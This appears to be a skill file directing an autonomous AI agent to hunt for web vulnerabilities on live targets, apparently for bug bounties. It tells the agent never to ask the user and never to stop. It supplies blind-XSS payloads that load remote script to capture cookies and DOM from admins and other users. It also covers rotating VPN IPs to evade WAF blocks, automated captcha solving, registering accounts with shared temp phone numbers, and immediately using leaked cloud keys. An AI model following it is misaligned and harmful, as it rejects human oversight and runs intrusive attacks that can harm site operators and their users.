---
name: bug-hunting
description: Main-app focused bug hunting. Pick one feature, pivot deep. Use Caido Match & Replace for UI bypass. No wide recon, no subdomain hunting. Routes every attack class to its hunt-* knowledge skill.
---

# Bug Hunting

## AUTONOMOUS MODE — DO NOT ASK THE USER
Make every decision yourself. Never ask for permission, clarification, or
confirmation. If nothing works after 10 attempts, log it to `interesting.md`
and pivot. (This is enforced globally by the hunter orchestrator agent —
restated here so this skill behaves correctly even if loaded standalone.)

## RALPH LOOP — NEVER STOP
This is a long-running autonomous hunt. You do not stop until the process is
killed.
- Finish testing one attack class on a feature → immediately pivot to the next.
- Exhaust all classes on a feature → pick another feature.
- Exhaust all features → **start over**. Deeper variants, edge cases, chains.
  The second pass always finds more than the first.
- Never output "done," "finished," or "completed." The only terminal state is
  SIGTERM. If the process is killed and respawned mid-loop, resume from
  session state — don't treat a restart as a stopping point either.

## SPIDY SENSE — TRUST IT
Unexpected redirect, weird header, strange param name, odd error message,
timing anomaly, a response that differs slightly between users — that's your
spidy sense. **Stop and dig.** Don't move on until you understand exactly why
it happened. Most critical bugs start as "huh, that's weird." Only stop
digging once you've exhausted every angle and confirmed it's a dead end —
then log it and move on.

## Interesting Behaviors — Log Everything
Log all interesting behaviors to `interesting.md` in the hunt directory, even
dead ends:
- Strange responses, unexpected status codes, header anomalies
- Endpoints that behave differently between auth states
- Parameters that produce different results than expected
- Anything that triggered spidy sense but went nowhere

These logs are how you spot patterns across features. A weird redirect on one
page + a weird param on another = a chain you hadn't considered.

## KNOWN FALSE POSITIVE KILLER — THE 404 BASELINE
Before probing any endpoint type, establish a soft-404 control per target.
Modern estates (SPA/Next.js/React behind a CDN) return **HTTP 200 with the
application shell for paths that don't exist** — a status code proves nothing.

```bash
for P in /zzz-nope-12345 /qqq-other-98765; do
  printf "%-20s " "$P"
  curl -sk -m 12 -o /tmp/b -w "%{http_code} %{size_download} " "$TARGET$P"
  shasum /tmp/b | cut -c1-12
done
```

Record the **status + byte length + body hash** triple — that's the control.
No endpoint is "found" until its response differs from the control. Compare
bodies, never status codes alone. Re-derive per path depth where a framework
renders different fallbacks for `/x` and `/a/b/x`.

### Marker Discipline — same anti-false-positive spirit
Any marker you inject (reflection, cache-poison, param pollution, OOB SSRF)
must be unique and unmistakable:
- 8+ random alphanumerics, no English words, no protocol keywords. NEVER
  `test`, `marker`, `evil`, `attacker`, `script`, `AAAA`, `BBBB`, your domain.
  Good: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_<random>_ZZ__`.
- Before claiming reflection, search the **baseline** (no-marker) response
  for the marker — if it appears naturally, change it. This kills ~80% of
  reflection false positives on its own.
- Sub-tag OOB callbacks (`authsrc·<collector>`, `dlcur·<collector>`) so a hit
  identifies exactly which sink fired.

## Strategy: Main App Guy
- **One target**: the main application. Not subdomains, not staging, not
  api.subdomain.
- **Feature-driven**: pick one feature, throw every bug class at it. IDOR
  didn't work? Try mass assignment. No? Race condition. No? JWT. The feature
  determines the attacks, not a checklist.
- **Pivot hard**: every response is a lead. A 403 → test auth bypass. A
  verbose error → probe for injection. A user ID → test IDOR. A JWT → test
  JWT attacks.
- **Browser-driven pivots**: a UI action that reveals a new API call is a
  lead just like a 403 or a verbose error — pivot into that endpoint the
  same way.
- **No wide hunting**: don't burn tokens on URL enumeration or sourcemaps.
  You already have the target. Hack it.

## KNOWLEDGE LAYER — hunt-* SKILLS ARE THE PLAYBOOKS
Claude-BugHunter's `hunt-*` skills (hunt-idor, hunt-xss, hunt-ssrf, …) carry
the per-class depth: crown-jewel targets, attack-surface signals, payloads,
bypass tables, chain templates, real disclosed-report citations. **They are
the source of truth for HOW to test a class.** This skill is the orchestration
core: it decides WHEN and WITH WHAT to test, then delegates technique to the
right hunt-* skill.

> CBH's own orchestrators (`bug-bounty`, `bb-local-toolkit`, `bb-methodology`,
> `hunt-dispatch`), wide-recon/OSINT skills (`web2-recon`, `hunt-subdomain`,
> `osint-methodology`, `offensive-osint`), enterprise-infra/IR skills
> (`okta-attack`, `m365-entra-attack`, `hunt-k8s`, `hunt-cicd`, `redteam-mindset`,
> …) and web3 skills are intentionally NOT installed — out of profile (no wide
> recon, Intigriti web). Orchestration is owned by this skill + the hunter agent,
> validation by @bug-validator. Installed CBH set = `hunt-*` (60) + tech-stack +
> reporting/writeup.

### Loading rules
1. **Load before you test.** The moment you commit to an attack class on a
   feature, load the matching hunt-* skill (`@hunt-idor`, `@hunt-xss`, …) via
   the skill tool. One load per class — don't hold it for later.
2. **Tech-stack skills load on fingerprint.** When a feature fingerprints as
   Next.js/Node/Laravel/Spring/ASP.NET/SharePoint/GraphQL/gRPC (from body
   markers like `__NEXT_DATA__`, `laravel_session`, headers, JS bundles),
   load the matching tech skill too — they encode the framework-specific
   bypasses that generic tests miss.
3. **Don't re-read payloads here.** If a class's technique is already in the
   loaded hunt-* skill, execute it there rather than from memory.
4. If no hunt-* skill matches a class you're testing, fall back to the
   generic classes you know and log the gap to `interesting.md`.

### Class → hunt skill → execution primitive
The primitive is THIS infra (Caido/curl/OOB). The technique is the skill's.

| Class | Load | Execution primitive (this infra) |
|---|---|---|
| IDOR | @hunt-idor | curl via proxy, swap IDs across userA/userB, diff bodies |
| Auth bypass / session | @hunt-auth-bypass, @hunt-session | curl — drop cookie, swap between users, expired/empty tokens |
| Mass assignment / API misconfig | @hunt-api-misconfig, @hunt-shadow-api | curl PATCH/PUT, extra fields (role, isAdmin, premium, featureFlags) |
| XSS (reflected/DOM/stored) | @hunt-xss, @hunt-dom | curl reflect probes + Playwright MCP render; blind → xss.report |
| SSRF | @hunt-ssrf | curl URL/webhook/image params → cloudflared tunnel OOB |
| SQLi / NoSQLi | @hunt-sqli, @hunt-nosqli | curl time/boolean markers; @batch_send for param fuzzing |
| SSTI | @hunt-ssti | curl `{{7*7}}` / `${7*7}` markers, confirm engine before RCE |
| Command injection | @hunt-rce | curl benign id/sleep markers (authorized targets only) |
| JWT | @hunt-jwt-crypto | curl — alg:none, weak secret, kid injection, role tampering |
| Race condition | @hunt-race-condition | **Caido `race_window_send`** — 5–10 concurrent, check dup processing |
| OAuth / SAML / MFA | @hunt-oauth, @hunt-saml, @hunt-mfa-bypass | curl + Playwright MCP (redirect_uri, state, PKCE, XSW) |
| GraphQL | @hunt-graphql | curl introspection → then @batch_send/automate for id substitution |
| File upload | @hunt-file-upload | curl multipart — extension/sniff/magic-byte bypasses |
| Deserialization | @hunt-deserialization | curl — `rO0A`, VIEWSTATE, rememberMe markers + OOB |
| Host header | @hunt-host-header | curl `-H 'Host: evil'` — reflection/cache/pw-reset poisoning |
| HTTP smuggling | @hunt-http-smuggling | Caido raw replay — CL.TE / TE.CL, timing confirm |
| Open redirect | @hunt-open-redirect | curl `-sI` — inspect Location header |
| ATO / forgot password | @hunt-ato, @hunt-forgot-password | curl flows — email change w/o re-auth, token validity |
| LFI / path traversal | @hunt-lfi | curl `../../`, `php://filter`, wrapper payloads |
| XXE | @hunt-xxe | curl XML body + cloudflared OOB |
| Business logic | @hunt-business-logic | Playwright MCP-driven state-machine + curl replays |
| Cache poisoning | @hunt-cache-poison | curl + tamper rules — unkeyed headers, then verify via Playwright MCP |
| CORS / CSRF / clickjacking | @hunt-cors, @hunt-csrf, @hunt-clickjacking | curl with spoofed Origin; Playwright MCP for the rendered impact |
| Captcha / brute force | @hunt-captcha-bypass, @hunt-brute-force | Caido automate / @batch_send with delays |
| WebSocket | @hunt-websocket | Caido WS replay — authz on frames, origin checks |
| Source/secret leak | @hunt-source-leak | jxscout + JS bundle grep — `.env`, `.js.map`, hardcoded tokens |
| Everything else | @hunt-misc, @hunt-html-injection, @hunt-ldap, @hunt-ntlm-info | curl + the class conventions |

> Caido MCP tools still map exactly as before: `batch_send`/`race_window_send`
> for parallel/race, `create_tamper_rule`/`toggle_tamper_rule` for Match &
> Replace, automate for fuzzing, `list_requests` HTTPQL for history. Technique
> comes from hunt-*; transport comes from here.

## Repo Recon — Spawn After Initial Feature Exploration

Spawning `@repo-recon` is not optional and not a final-pass step. Do it early —
while your own exploration is still warm — so its findings steer the rest of
the hunt. The subagent runs **in parallel** with your continued testing.

### When to spawn

Trigger as soon as ANY of these are true:
- You can name the stack/package (from `X-Powered-By`, `__NEXT_DATA__`,
  generator meta tags, JS bundle names, `/version`, `CHANGELOG`)
- Target looks like an open-source product, CMS, or known app
- GitHub search for the company name returns a credible match

### How to spawn

```
@repo-recon

TARGET: <domain or product name>
VERSION_HINT: <anything fingerprinted — version string, framework, package name>
OUTPUT_DIR: ~/Projects/hunts/<handle>-<YYYYMMDD>/recon/
```

### What repo-recon does (load the skill to see full detail)

The subagent runs five phases:

| Phase | What it does |
|---|---|
| **0 — Discover** | `gh search repos`, org search, live target headers, JS bundle names |
| **1 — Clone** | Full history fetch (`--unshallow`), pin to deployed version |
| **2 — Deleted files & forensics** | Enumerate every file ever deleted; restore & read high-value ones (creds, config, old auth); sweep dangling/orphaned commits from force-pushes |
| **3 — Patch archaeology** | Find security commits; read the BEFORE-fix code to understand the anti-pattern; detect partial fixes (patched one file, missed siblings); grep current tree for unpatched instances |
| **4 — Dependency audit** | osv-scanner, gitleaks, trufflehog, npm audit |

### What comes back: `priority.json`

```
secrets_found          → leaked keys/tokens in git history — test immediately
deleted_files_of_interest → recovered content of removed credential/config files
vuln_priority          → ranked vuln classes by historical frequency
  ↳ pattern           → exact anti-pattern to grep for in the live app
  ↳ partial_fix: true → patched in one place; siblings likely still vulnerable
  ↳ grep_command      → ready-to-run grep to find unpatched instances
patch_archaeology      → per-commit: pre-fix code, what wasn't fixed, attack hint
dependency_findings    → CVEs in pinned deps, exploitability context
open_issue_leads       → wontfix security issues = highest-priority endpoints
```

### How to use the results

- **`secrets_found`**: any entry with `verified: true` → test against the live
  app immediately. AWS key → call `aws sts get-caller-identity`. API key →
  hit the target's API endpoints. Don't wait.
- **`deleted_files_of_interest`**: read every recovered file. Old auth
  implementations reveal bypass paths. Old config files reveal infra structure.
- **`vuln_priority` rank 1**: that's the class the target historically can't
  stop shipping. Use `grep_command` against the live app source (jxscout
  output) to find unpatched instances. Attack those first.
- **`partial_fix: true`**: this commit patched ONE place. The `unpatched_siblings`
  list tells you exactly where the same bug still lives. Go there directly.
- **`patch_archaeology` → `attack_hint`**: read every hint. These are derived
  from the actual pre-fix code, not guesses.
- **`open_issue_leads` → `wontfix: true`**: maintainer explicitly declined to
  fix. Go straight to that endpoint.

All findings are hypotheses — `@bug-validator` still has the final say.

## Session Persistence

### Concurrent agents — REQUIRED bootstrap (do this FIRST, before any Playwright MCP call)

Two agents sharing one Playwright MCP server/browser instance will stomp
each other's tabs and cookies: if both agents call `browser_navigate` (or
any other Playwright MCP tool) against the same server connection, they're
driving the same browser context — one agent's navigation or login moves
the other agent's session too. Fix: each agent must run its **own Playwright
MCP server process**, launched with its **own `--user-data-dir`** pointing at
that account's Chrome profile. That gives each agent an independent browser
process, independent cookies/localStorage, and an independent MCP
connection — the direct equivalent of the old daemon-socket isolation.

| Isolation need | How it maps onto Playwright MCP |
|---|---|
| Which account slot you own (`userA` / `userB`) | `$AGENT_BROWSER_ACCOUNT` — unchanged, still your identity var |
| Separate cookies / login session | `--user-data-dir <profile-dir>` passed at Playwright MCP server launch |
| Separate browser process entirely | A separate Playwright MCP server instance/connection per agent (not a shared one with `--session` flags — Playwright MCP has no per-call session flag; isolation is at the server-process level) |

#### Self-discovery — you don't know which agent you are ahead of time

Both agents load the same skill. Neither knows if it is "agent 1" or "agent 2".
Run `claim-account.sh` at startup — it atomically races to claim the first free
slot, tells you who you are, and now also **launches (or attaches to) your own
Playwright MCP server instance pointed at that slot's profile dir**:

```bash
ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles

# Run this ONCE at the very start of the agent session:
eval "$(cd "$ABP" && ./claim-account.sh)"

# claim-account.sh outputs three export lines, e.g.:
#   export AGENT_BROWSER_ACCOUNT="userA"
#   export AGENT_BROWSER_PROFILE=".../.agent-browser-profiles/Profile-userA"
#   export PLAYWRIGHT_MCP_USER_DATA_DIR="$AGENT_BROWSER_PROFILE"
#
# The other agent racing concurrently will get userB automatically, with its
# own Playwright MCP server instance pointed at Profile-userB.
# After this, every Playwright MCP tool call in this agent's connection is
# fully isolated to this account's profile.
```

Check your identity any time:
```bash
echo "I am: $AGENT_BROWSER_ACCOUNT"
echo "My creds: {{SESSIONS_DIR}}/<target>/$AGENT_BROWSER_ACCOUNT.creds"
```

#### Release on clean exit
```bash
cd {{HACKBOT_MISC_DIR}}/.agent-browser-profiles && ./release-account.sh
# frees the slot for the next agent and signals your Playwright MCP server
# instance to shut down
```
A missed release is not fatal — stale locks from crashed agents are
auto-detected and cleared on the next `claim-account.sh` run.

#### How the lock works
`claim-account.sh` uses `mkdir(2)` atomicity (POSIX-guaranteed) as a lock
primitive. It records the calling shell's PID (`$PPID`) in the lock dir. On
the next claim, if that PID is dead, the lock is reclaimed automatically.
No shared files are written — only the per-agent Playwright MCP launch config
is touched, never a shared `config.json`.

### Single-agent / sequential use
If only one agent is running, `switch-account.sh <name>` still works — it
points your single Playwright MCP server instance at a different
`--user-data-dir` and restarts the browser process on the old profile.
**Do not call it when two agents run concurrently** (race condition on a
shared browser process).

### Profile layout
One Chrome profile per account under
`{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/Profile-<name>`. The profile
IS the session — cookies/localStorage persist inside it, and it's what you
pass as Playwright MCP's `--user-data-dir`. Every profile is cloned from
`Profile-Default`, so extensions + config (FoxyProxy, captcha solver) are
identical everywhere.

- **Reuse existing**: if `Profile-userA` exists and the account isn't dead,
  `claim-account.sh` will claim it and point your Playwright MCP instance at
  the existing cookies — no re-login needed.
- **Create if missing**: `./clone-profile.sh userA`, then run `claim-account.sh`,
  then log in once via Playwright MCP.
- **Two sessions, always**: userA and userB. If only userA's profile exists,
  `clone-profile.sh userB` and register it.
- **Re-auth**: if a session expires, log back in from that account's profile —
  the profile dir persists the new login automatically.
- **Sync extensions**: after changing FoxyProxy rules or captcha-solver config
  in the source profile, run `sync-extensions.sh` so the change reaches every
  account profile.
- **Creds**: durable login credentials live in
  `{{SESSIONS_DIR}}/<domain>/$AGENT_BROWSER_ACCOUNT.creds`.
  The auth state itself lives in the Chrome profile, not a state JSON.

## UI Bypass via Caido Match & Replace
Use `create_tamper_rule` / `toggle_tamper_rule` to flip UI-gating flags in
transit:
- Premium bypass, role escalation, feature flags, paywalls, rate limits,
  disabled/hidden fields.
- Browse the feature via Playwright MCP, inspect the response for boolean
  flags, create a tamper rule, reload.
- If the unlocked UI reveals new endpoints, pivot into them.

## Two or more Accounts — Always
### Why
IDOR validation requires a DIFFERENT authenticated session — seeing your own
data proves nothing. You need userA → userB cross-check.

### Registration email — MANDATORY, NO EXCEPTIONS
**Never register with `test@test.com`, `test@example.com`, or any made-up
domain.** Registration/verification emails must arrive somewhere real or the
account is useless the moment the target requires email verification.

Every registration email MUST follow this pattern:
```
{{EMAIL_BASE}}+<target>-a@{{EMAIL_DOMAIN}}   # userA
{{EMAIL_BASE}}+<target>-b@{{EMAIL_DOMAIN}}   # userB
```
(`-` also works as the separator if `+` gets stripped by a target's input
validation — try `+` first, fall back to `-`.) These forward into the
hackbot inbox — see the `@email-inbox-check` skill for how to list/read them.

### Phone number verification — sms_fetcher
When a target requires a **phone number** at registration (SMS OTP, 2FA setup,
number ownership check), use the pre-loaded temp numbers via `sms_fetcher`.
Never use your real number. Never make one up — unverifiable numbers mean a
dead account.

**List all available numbers:**
```bash
sms_fetcher --list
# Output:
# Index  Phone Number     Region
# ------------------------------------------
# 1      19392529150      Puerto Rico
# 2      19392348210      Puerto Rico
# 3      19398930201      Puerto Rico
# 4      19395930086      Puerto Rico
# 5      19392980127      Puerto Rico
# 6      12366021668      Canada (BC)
# 7      12364744574      Canada (BC)
```
Pick any number — format for registration: `+<number>` (e.g. `+12366021668`).
Use a **different number for userA and userB** — never the same number on two
accounts for the same target.

**Check received SMS for a number:**
```bash
sms_fetcher -n 12366021668
# Output shows all recent messages with timestamp, sender, and body:
# [2026-09-13T14:01:47Z] From: +1 226-828-0540
#   Please use 218526 as login code for 3Fun (valid in 5 minutes)
```
Extract the OTP/verification code from the message body.

**Standard phone verification flow:**
```
1. Pick a number: sms_fetcher --list → pick index 1 for userA, index 2 for userB
2. Enter number at registration: +19392529150 (userA), +19392348210 (userB)
3. Wait for SMS: sms_fetcher -n 19392529150
   → scan latest message from the target's sender for the OTP code
4. Enter the OTP via Playwright MCP to complete verification
5. Write the chosen number into the creds file:
   echo "phone=+19392529150" >> {{SESSIONS_DIR}}/<target>/userA.creds
```

**If no SMS arrives within 60 seconds:**
- Try requesting the code again (most targets allow a resend)
- If still nothing after 2 attempts, switch to a different number from the list
  (`sms_fetcher --list` → pick a different index) and update the creds file
- Numbers are shared — a previous message from the same sender means that
  number was used on that target before. Pick a different one.

### Before registering ANY account, in this order:
1. **You must have claimed your account first** — `$AGENT_BROWSER_ACCOUNT` must
   be set (see Session Persistence above). Check: `echo $AGENT_BROWSER_ACCOUNT`.
2. Check `{{SESSIONS_DIR}}/<domain>/$AGENT_BROWSER_ACCOUNT.creds` for
   an existing account. If found and not dead/banned, log in with those
   credentials instead of registering a new one.
3. If no creds file exists, ensure your profile exists (it should — `claim-account.sh`
   validates this, but check anyway):
   ```bash
   ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
   [ -d "$ABP/Profile-$AGENT_BROWSER_ACCOUNT" ] || \
     (cd "$ABP" && ./clone-profile.sh "$AGENT_BROWSER_ACCOUNT")
   ```
4. Your Playwright MCP server is already pointed at your profile (set by
   `claim-account.sh` via `--user-data-dir`). Just navigate — no switch
   needed:
   ```
   Playwright MCP: browser_navigate("$TARGET/register")   # captcha solver already active
   ```
5. Immediately after successful registration — before doing anything else —
   write the credentials:
   ```bash
   # Derive the email suffix: userA → "a", userB → "b"
   SUFFIX=$(echo "$AGENT_BROWSER_ACCOUNT" | sed 's/user//')
   cat > {{SESSIONS_DIR}}/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds <<EOF
   email={{EMAIL_BASE}}+${TARGET}-${SUFFIX}@{{EMAIL_DOMAIN}}
   password=${GENERATED_PASSWORD}
   created=$(date -u +%Y-%m-%dT%H:%M:%SZ)
   EOF
   chmod 600 {{SESSIONS_DIR}}/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds
   ```
   This is not an end-of-hunt cleanup step — do it immediately or a
   crash/pivot mid-hunt loses the account.
6. If the target sends a verification email, check the inbox using the
   `@email-inbox-check` skill's filtered list — never poll the raw endpoint.

### Workflow (profile-based; curl still the IDOR transport)
```bash
ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
TARGET=https://example.com

# 0. Bootstrap — each agent runs this ONCE at session start.
#    Both agents run the exact same line; claim-account.sh assigns them
#    different slots (userA / userB) automatically and points each agent's
#    Playwright MCP server instance at the matching profile dir.
eval "$(cd "$ABP" && ./claim-account.sh)"
# → $AGENT_BROWSER_ACCOUNT is now set (e.g. "userA")
# → $AGENT_BROWSER_PROFILE is set, and your Playwright MCP server was
#   launched/attached with --user-data-dir=$AGENT_BROWSER_PROFILE

# 1. Ensure your Chrome profile exists (clone from Default if missing)
[ -d "$ABP/Profile-$AGENT_BROWSER_ACCOUNT" ] || \
  (cd "$ABP" && ./clone-profile.sh "$AGENT_BROWSER_ACCOUNT")

# 2. Register in your profile (Playwright MCP already uses the right
#    profile because it was launched with your --user-data-dir — no
#    switch needed)
Playwright MCP: browser_navigate("$TARGET/register")
# ... fill form (browser_type / browser_click / browser_fill_form),
# verify email, confirm login persisted in your profile dir

# 3. Keep extensions/config in sync whenever FoxyProxy or captcha-solver
#    config changes in the source profile:
(cd "$ABP" && ./sync-extensions.sh)

# 4. IDOR cross-check — each agent stays in its own browser process; curl
#    does the swap. Collect your own resource IDs via Playwright MCP, then
#    hit the other account's IDs via curl with your own cookies:
Playwright MCP: browser_navigate("$TARGET/profile")   # note your resource IDs
# Export cookies and replay as the other user via curl:
# curl -sk --proxy 127.0.0.1:8080 -b /tmp/my_cookies.txt \
#   "$TARGET/api/profile/<other-user-id>"
# If you get the other user's data → IDOR confirmed
```

### Workflow (curl-based token swap, captcha-less targets)
```bash
# 1. Register both users, grab tokens
UA=$(curl -sk -X POST "$TARGET/register" \
  -d "username=hunter_a_$(date +%s)&password=Pass123!" \
  -c - | grep token | awk '{print $NF}')

UB=$(curl -sk -X POST "$TARGET/register" \
  -d "username=hunter_b_$(date +%s)&password=Pass123!" \
  -c - | grep token | awk '{print $NF}')

# 2. Test IDOR — request userA's resource with userB's token
curl -sk "$TARGET/api/profile" -b "token=$UA"    # userA's own data
curl -sk "$TARGET/api/profile" -b "token=$UB"    # userB's own data

# 3. Swap: userA's endpoint ID with userB's token
curl -sk "$TARGET/api/profile/17" -b "token=$UB" # userB accessing userA's profile

# 4. If they match or userB sees userA's fields → IDOR confirmed
```

## WAF Blocks / IP Rotation

If requests start getting blocked by a WAF (repeated 403s, CAPTCHA
challenges, rate-limit walls that don't clear, or a sudden drop in response
variety suggesting fingerprinting) — do not keep retrying the same IP.
Rotate immediately using our local WireGuard script:

```bash
changeip            # Next server sequentially
changeip US         # Next server in a specific country (e.g. US, JP, CA, MX)
changeip off        # Disconnect VPN entirely (internet stays up)
changeip status     # Check current IP and connection
```

- `changeip` cycles through free WireGuard configs located in `/home/aceos/Downloads/servers/`.
- Once connected, it automatically verifies the new IP and restores internet. Resume testing immediately.

### Cookie-based fallback
```bash
curl -sk -X POST "$TARGET/login" -d "username=userA&password=pass" \
  -c /tmp/userA_cookies.txt
curl -sk "$TARGET/api/resource" -b /tmp/userA_cookies.txt
curl -sk "$TARGET/api/resource" -b /tmp/userB_cookies.txt
```

## Fuzzing

### Body Integrity Warning
`edit_request` prepends `\r\n\r\n` to any body you pass, corrupting
form-urlencoded POST bodies (`\r\n\r\ndisplay_name` instead of `display_name`).
Workaround: use `curl --proxy 127.0.0.1:8080` with the exact body, or prefix
with a dummy field (`x=&real_key=value`).

### Blind fuzzing
If the target is mostly blind (no reflected output), use Caido Automate with
`create_automate_session`/`get_automate_entry` or keep the probe small and
check status/length variance — never assume a silent 200 is a pass.

- **Payloads**: `{{PAYLOADS_DIR}}`
- **Path fuzzing**: `Pentester_wordlist.pay`
- **Parameter fuzzing via Caido Automate**: `batch_send` to fuzz a single
  endpoint — replace values, vary types, add unexpected params. threads=3,
  add request delay to avoid rate limiting.
- **If the site is too restrictive**: skip fuzzing. No point fighting WAFs —
  pivot to manual testing and tamper rules.

## OOB / Blind Detection

Two collector setups, pick based on what's being tested.

### Blind XSS — xss.report collector
Primary collector for blind XSS: `{{BLIND_XSS_URL}}`. Use this on any input
that isn't reflected back in the immediate response — support tickets,
usernames, file names/metadata, admin-review queues, log viewers, order
notes, email templates, user-agent/referer-logged fields, anywhere a
privileged user (admin, support agent, another user) might view the value
later in a different context than where it was submitted.

Payload set (rotate through these depending on injection context — HTML
body, attribute, or a context that already breaks out of an existing tag):

```html
<!-- HTML body context -->
'"><script src={{BLIND_XSS_URL}}></script>

<!-- Attribute-breakout / filtered-<script> context -->
<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'{{BLIND_XSS_URL}}\';document.body.appendChild(a)')" />

<!-- Inline <script> context, no src filtering -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{{BLIND_XSS_URL}}");a.send();</script>
```

Workflow:
- Fire the payload set into every candidate field found during normal
  feature testing (see XSS section above) — don't wait for a dedicated
  "blind XSS pass," inject as you go.
- Log every field + payload variant used to `interesting.md` so a hit can be
  traced back to the exact injection point later.
- xss.report is a dashboard-based collector, not email — check
  `{{BLIND_XSS_URL}}` periodically during a long-running hunt for
  fired payloads (source IP, cookies, DOM, screenshot). Don't poll it
  constantly; check after finishing a feature pass or when returning to the
  hunt after a break.
- On a hit: pull the full callback detail (URL, cookies, referrer) from the
  dashboard, confirm which field/session triggered it from your
  `interesting.md` log, then hand off to `@bug-validator` with the raw
  callback evidence — same validation rule as everything else.

### Blind SSRF — Cloudflare tunnel
- `cloudflared tunnel --url http://localhost:8089`
- Point webhooks/image URLs/file-fetch params at the tunnel URL
- Check tunnel logs for inbound requests to confirm
- Fallback: `interactsh-client` or Burp Collaborator

## Captcha Solving — captcha-bridge MCP

The captcha-bridge MCP controls the reCAPTCHA-solver extension already loaded
in every Chrome profile. **The extension does NOT auto-click** — you must
trigger it via MCP every time a CAPTCHA appears.

> **2-minute window:** A solved token is valid for exactly 120 seconds.
> After that the token expires and any form submit will silently fail or
> return an error. Always submit the form immediately after `wait_for_captcha`
> returns `solved` — never fill the form first and solve later.

---

### The 4 MCP calls — exact syntax + what comes back

#### 1. `captcha-bridge: click_captcha`
Sends a click to the reCAPTCHA checkbox. The extension fires the click on its
next poll cycle (~500 ms). Call this **once** per CAPTCHA appearance — calling
it twice can cause the checkbox to uncheck.

```json
// Call (session is optional — omit for single-tab)
{ "session": "<tab_id>" }

// Response (always immediate — just acknowledges the click was queued)
{ "ok": true }
```

Do NOT call `wait_for_captcha` before `click_captcha` — you have to trigger
the solve before you can wait for it.

---

#### 2. `captcha-bridge: wait_for_captcha`
Blocks until solved, failed, or timeout. Call this **right before you submit
the form** so you know you have a live token.

```json
// Call — all fields optional
{
  "session": "<tab_id>",
  "timeoutSeconds": 60,
  "pollIntervalMs": 500
}
```

**Possible responses:**

```json
// ✅ Solved and still valid — submit now
{
  "state": "solved",
  "expiresAt": "2026-09-13T18:35:00Z",
  "remainingMs": 118000,
  "expired": false
}

// ⏰ Token expired mid-wait — reload, reset, re-solve
{
  "state": "expired",
  "action": "refresh_page",
  "expired": true
}

// ❌ Solve failed (challenge rejected, extension error)
{ "state": "failed" }

// ⏱ Timed out waiting — CAPTCHA may not be visible yet
{ "state": "timeout" }
```

**Decision logic after `wait_for_captcha`:**
```
state == "solved" AND remainingMs > 10000  →  submit immediately
state == "solved" AND remainingMs < 10000  →  reload, reset, re-solve (borderline)
state == "expired" OR action == "refresh_page"  →  reload, reset, re-solve
state == "failed"  →  reload page, click_captcha again (retry up to 3×)
state == "timeout"  →  CAPTCHA may not be visible — scroll to it, click_captcha again
```

---

#### 3. `captcha-bridge: get_captcha_status`
One-shot check — does not block. Use to peek at state without waiting.

```json
// Call
{ "session": "<tab_id>" }

// Response — same shape as wait_for_captcha
{
  "state": "solved",          // idle | solving | solved | expired | failed
  "expiresAt": "2026-09-13T18:35:00Z",
  "remainingMs": 95000,
  "expired": false
}
```

Use instead of `wait_for_captcha` when:
- You want a quick non-blocking check after `click_captcha`
- You want to reuse a solve across two forms (`remainingMs > 30000` = reuse it)

---

#### 4. `captcha-bridge: reset_captcha_session`
Clears all stored state for a session. **Required** after any page reload —
otherwise the old expired/solved entry is still cached.

```json
// Call — session is REQUIRED here (not optional)
{ "session": "<tab_id>" }

// Response
{ "ok": true }
```

Call this **after** the reload, **before** `click_captcha`. Order matters:
```
navigate → reset_captcha_session → click_captcha → wait_for_captcha → submit
```

---

### Complete worked example — registering userA

```
Step 1: Open registration page
  Playwright MCP: browser_navigate("https://app.target.com/register")
  → note the tab ID from browser_tab_list, e.g. "tab-42"

Step 2: Trigger solve
  captcha-bridge: click_captcha { "session": "tab-42" }
  → { "ok": true }

Step 3: Wait for solve
  captcha-bridge: wait_for_captcha { "session": "tab-42", "timeoutSeconds": 60 }
  → { "state": "solved", "remainingMs": 117500, "expired": false }
  remainingMs = 117 500 ms → well within window, proceed immediately

Step 4: Fill form and submit (while token is still live)
  Playwright MCP: browser_type(element="Email field", ref="#email", text="{{EMAIL_BASE}}+target-a@{{EMAIL_DOMAIN}}")
  Playwright MCP: browser_type(element="Password field", ref="#password", text="P@ss9z!mX2")
  Playwright MCP: browser_click(element="Submit button", ref="#submit-btn")
  → account created

Step 5: Write creds immediately
  cat > {{SESSIONS_DIR}}/target/userA.creds << EOF
  email={{EMAIL_BASE}}+target-a@{{EMAIL_DOMAIN}}
  password=P@ss9z!mX2
  created=2026-09-13T18:31:00Z
  EOF
```

---

### Expiry recovery — full sequence

```
captcha-bridge: wait_for_captcha { "session": "tab-42" }
→ { "state": "expired", "action": "refresh_page" }

1. Playwright MCP: browser_navigate("https://app.target.com/register")
2. captcha-bridge: reset_captcha_session { "session": "tab-42" }
   → { "ok": true }
3. captcha-bridge: click_captcha { "session": "tab-42" }
   → { "ok": true }
4. captcha-bridge: wait_for_captcha { "session": "tab-42", "timeoutSeconds": 60 }
   → { "state": "solved", "remainingMs": 119000 }
5. Fill form → submit immediately
```

---

### Multi-user parallel registration (userA + userB)

```
Tab A = "tab-10"  (userA's registration page, own Playwright MCP instance)
Tab B = "tab-11"  (userB's registration page, own Playwright MCP instance)

captcha-bridge: click_captcha    { "session": "tab-10" }
captcha-bridge: wait_for_captcha { "session": "tab-10", "timeoutSeconds": 60 }
→ solved, remainingMs: 116000
→ fill + submit userA form immediately

captcha-bridge: click_captcha    { "session": "tab-11" }
captcha-bridge: wait_for_captcha { "session": "tab-11", "timeoutSeconds": 60 }
→ solved, remainingMs: 118000
→ fill + submit userB form immediately
```

Omit `session` only with a single tab — ambiguous when multiple tabs are open.

---

### Captcha bypass testing (separate concern)

`@hunt-captcha-bypass` in the class table = **attacking** captcha
implementations (replaying tokens, sharing across users, entropy weaknesses,
missing server-side validation). Completely separate from solving.
- For bypass testing: use Caido automate / `batch_send` to replay tokens
- Never use captcha-bridge tools for bypass testing

## Browser Session — Keep Open

The browser is a headed Chromium session driven via Playwright MCP and
managed by the user. Never close it — just navigate for a fresh page.
⚠ idleTimeout is removed from config. The browser stays open forever. Do NOT
add a timeout back.
- Each Playwright MCP server instance auto-saves cookies/localStorage into
